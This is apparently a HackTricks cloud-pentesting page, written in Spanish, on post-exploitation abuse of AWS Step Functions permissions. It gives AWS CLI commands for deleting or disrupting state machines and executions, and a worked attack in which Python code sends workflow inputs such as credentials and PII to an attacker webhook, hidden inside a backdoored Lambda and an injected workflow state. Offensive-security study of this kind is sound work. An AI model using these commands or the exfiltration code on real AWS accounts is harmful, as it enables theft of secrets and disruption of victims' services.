# AWS - Step Functions Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Step Functions

Para más información sobre este servicio de AWS, consulta:

{{#ref}}
../../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### `states:RevealSecrets`

Este permiso permite **revelar datos secretos dentro de una ejecución**. Para ello, es necesario establecer Inspection level en TRACE y el parámetro revealSecrets en true.

<figure><img src="../../../images/image (348).png" alt=""><figcaption></figcaption></figure>

### `states:DeleteStateMachine`, `states:DeleteStateMachineVersion`, `states:DeleteStateMachineAlias`

Un atacante con estos permisos podría eliminar permanentemente state machines, sus versions y aliases. Esto puede interrumpir flujos de trabajo críticos, provocar pérdida de datos y requerir un tiempo significativo para recuperar y restaurar las state machines afectadas. Además, permitiría a un atacante borrar las pistas utilizadas, entorpecer las investigaciones forenses y potencialmente paralizar las operaciones al eliminar procesos de automatización esenciales y configuraciones de estado.

> [!NOTE]
>
> - Al eliminar una state machine también eliminas todas sus versions y aliases asociados.
> - Al eliminar un state machine alias no se eliminan las state machine versions que referencian este alias.
> - No es posible eliminar una state machine version que actualmente esté referenciada por uno o más aliases.
```bash
# Delete state machine
aws stepfunctions delete-state-machine --state-machine-arn <value>
# Delete state machine version
aws stepfunctions delete-state-machine-version --state-machine-version-arn <value>
# Delete state machine alias
aws stepfunctions delete-state-machine-alias --state-machine-alias-arn <value>
```
- **Impacto potencial**: Interrupción de flujos de trabajo críticos, pérdida de datos y tiempo de inactividad operativo.

### `states:UpdateMapRun`

Un atacante con este permiso podría manipular la configuración de fallos y la opción de paralelismo de Map Run, pudiendo aumentar o disminuir el número máximo de ejecuciones de flujos de trabajo hijo permitidas, afectando directamente al rendimiento del servicio. Además, un atacante podría alterar el porcentaje y el recuento de fallos tolerados, pudiendo reducir este valor a 0, de modo que cada vez que un elemento falle, todo el Map Run fallaría, afectando directamente a la ejecución de la máquina de estados y potencialmente interrumpiendo flujos de trabajo críticos.
```bash
aws stepfunctions update-map-run --map-run-arn <value> [--max-concurrency <value>] [--tolerated-failure-percentage <value>] [--tolerated-failure-count <value>]
```
- **Impacto potencial**: Degradación del rendimiento y la interrupción de flujos de trabajo críticos.

### `states:StopExecution`

Un atacante con este permiso podría detener la ejecución de cualquier state machine, interrumpiendo flujos de trabajo y procesos en curso. Esto podría dar lugar a transacciones incompletas, operaciones comerciales detenidas y la posible corrupción de datos.

> [!WARNING]
> Esta acción no es compatible con **express state machines**.
```bash
aws stepfunctions stop-execution --execution-arn <value> [--error <value>] [--cause <value>]
```
- **Impacto potencial**: Interrupción de flujos de trabajo en curso, tiempo de inactividad operativo y posible corrupción de datos.

### `states:TagResource`, `states:UntagResource`

Un atacante podría añadir, modificar o eliminar etiquetas de los recursos de Step Functions, lo que interrumpiría la asignación de costes de su organización, el seguimiento de recursos y las políticas de control de acceso basadas en etiquetas.
```bash
aws stepfunctions tag-resource --resource-arn <value> --tags Key=<key>,Value=<value>
aws stepfunctions untag-resource --resource-arn <value> --tag-keys <key>
```
**Impacto potencial**: Interrupción de la asignación de costos, el seguimiento de recursos y las políticas de control de acceso basadas en etiquetas.

---

### `states:UpdateStateMachine`, `lambda:UpdateFunctionCode`

An attacker que compromete a un usuario o rol con los siguientes permisos:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "AllowUpdateStateMachine",
"Effect": "Allow",
"Action": "states:UpdateStateMachine",
"Resource": "*"
},
{
"Sid": "AllowUpdateFunctionCode",
"Effect": "Allow",
"Action": "lambda:UpdateFunctionCode",
"Resource": "*"
}
]
}
```
...puede llevar a cabo un **ataque post-exploitation de alto impacto y sigiloso** combinando Lambda backdooring con manipulación de la lógica de Step Function.

Este escenario asume que la víctima usa **AWS Step Functions para orquestar flujos de trabajo que procesan entradas sensibles**, como credenciales, tokens o PII.

Ejemplo de invocación de la víctima:
```bash
aws stepfunctions start-execution \
--state-machine-arn arn:aws:states:us-east-1:<victim-account-id>:stateMachine:LegitStateMachine \
--input '{"email": "victim@example.com", "password": "hunter2"}' --profile victim
```
Si la Step Function está configurada para invocar una Lambda como `LegitBusinessLogic`, el atacante puede proceder con **dos variantes de ataque sigilosas**:

---

####  Función Lambda actualizada

El atacante modifica el código de la función Lambda ya utilizada por la Step Function (`LegitBusinessLogic`) para exfiltrar silenciosamente los datos de entrada.
```python
# send_to_attacker.py
import requests

def lambda_handler(event, context):
requests.post("https://webhook.site/<attacker-id>/exfil", json=event)
return {"status": "exfiltrated"}
```

```bash
zip function.zip send_to_attacker.py

aws lambda update-function-code \
--function-name LegitBusinessLogic \
--zip-file fileb://function.zip -profile attacker
```
---

#### Agregar un estado malicioso a la Step Function

Alternativamente, el atacante puede inyectar un **exfiltration state** al inicio del flujo de trabajo actualizando la definición de la Step Function.
```malicious_state_definition.json
{
"Comment": "Backdoored for Exfiltration",
"StartAt": "OriginalState",
"States": {
"OriginalState": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:<victim-id>:function:LegitBusinessLogic",
"End": true
}
}
}

```

```bash
aws stepfunctions update-state-machine \
--state-machine-arn arn:aws:states:us-east-1:<victim-id>:stateMachine:LegitStateMachine \
--definition file://malicious_state_definition.json --profile attacker
```
El atacante puede ser aún más sigiloso y actualizar la definición de estado a algo como esto
{
"Comment": "Backdoored for Exfiltration",
"StartAt": "ExfiltrateSecrets",
"States": {
"ExfiltrateSecrets": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:victim-id:function:SendToAttacker",
"InputPath": "$",
"ResultPath": "$.exfil",
"Next": "OriginalState"
},
"OriginalState": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:victim-id:function:LegitBusinessLogic",
"End": true
}
}
}
donde la víctima no notará la diferencia

---

### Configuración de la víctima (Context for Exploit)

- Una Step Function (`LegitStateMachine`) se usa para procesar entradas sensibles de usuario.
- Llama a una o más funciones Lambda como `LegitBusinessLogic`.

---

**Impacto potencial**:
- Exfiltration silenciosa de datos sensibles, incluidos secrets, credentials, API keys y PII.
- No hay errores visibles ni fallos en la ejecución del flujo de trabajo.
- Difícil de detectar sin auditar el código Lambda o las trazas de ejecución.
- Permite persistencia a largo plazo si el backdoor permanece en el código o en la lógica ASL.


{{#include ../../../../banners/hacktricks-training.md}}
